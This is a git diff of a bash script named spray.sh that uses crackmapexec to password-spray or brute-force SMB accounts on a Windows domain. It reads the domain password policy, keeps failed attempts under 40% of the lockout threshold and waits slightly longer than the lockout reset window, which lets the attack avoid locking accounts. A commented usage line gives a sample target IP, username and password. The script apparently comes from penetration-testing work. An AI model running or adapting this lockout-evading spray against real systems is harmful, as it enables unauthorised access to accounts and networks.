@@ -4,7 +4,7 @@
 #author		 :whoamins
 #date            :02.08.2022
 #version         :0.1
-#usage		 :./script.sh ip username password
+#usage		 :./spray.sh ip username password
 #notes           :Install crackmapexec to use this script.
 #bash_version    :5.1.16(1)-release
 #==============================================================================
@@ -38,7 +38,7 @@ start_brute_with_suitable_users() {
 get_domain_password_policy() {
 	crackmapexec smb $ip -u $username -p $password --pass-pol | tee /tmp/pass_policy
 	account_lockout_threshold=$(cat /tmp/pass_policy | grep "Account Lockout Threshold:" | awk -F ':' '{print $2}')
-	reset_account_lockout_counter=$(cat /tmp/pass_policy | grep "Reset Account Lockout Counter:" | cut -d ':' -f2 | cut -d ' ' -f2)
+	reset_account_lockout_counter=$(($(cat /tmp/pass_policy | grep "Reset Account Lockout Counter:" | cut -d ':' -f2 | cut -d ' ' -f2) + 1))
 	b=0.4 # 0.4 = 40%
 	safe_badpwdcount=$(echo "$account_lockout_threshold $b" | awk '{print $1 * $2}')
 	reset_account_lockout_counter="${reset_account_lockout_counter}m" # TODO: Minutes, Hours....
@@ -47,6 +47,9 @@ get_domain_password_policy() {
 }
 
 get_args() {
+	# if (($# != 3)); then
+ #    	echo "./spray.sh 10.11.1.195 ilsaf.nabiullin P@ssw0rd"
+	# fi
     ip=${commandline_args[0]};
     username=${commandline_args[1]}
     password=${commandline_args[2]}
